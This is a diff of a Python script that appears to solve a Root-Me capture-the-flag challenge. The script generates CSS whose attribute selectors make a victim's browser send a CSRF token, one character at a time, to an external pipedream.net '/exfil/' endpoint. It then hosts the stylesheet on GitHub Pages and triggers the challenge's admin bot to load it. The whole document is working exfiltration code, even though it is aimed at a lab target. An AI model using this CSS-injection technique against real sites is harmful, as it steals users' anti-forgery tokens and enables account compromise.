@@ -8,11 +8,11 @@ def build_css(chars):
 
     # création du new file
     file = open("./a.css", "w") 
-    file.write("input[name=csrf] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/"+chars+") }") 
+    file.write("input[name=csrf][value^="+chars+"] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/"+chars+") }") 
     file.close()
 
 # ----
-chars = "yABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
+chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
 know  = ""
 
 # envoie à admin 
@@ -31,7 +31,7 @@ while 1:
         os.system('git push')
 
         # request
-        requests.get("http://challenge01.root-me.org:58005/?style=https://kixisaleesd.github.io/test/a")
+        requests.get("http://challenge01.root-me.org:58005/?style=https://kixisaleesd.github.io/test/y")
 
 
     know += input("new chars to know : ")
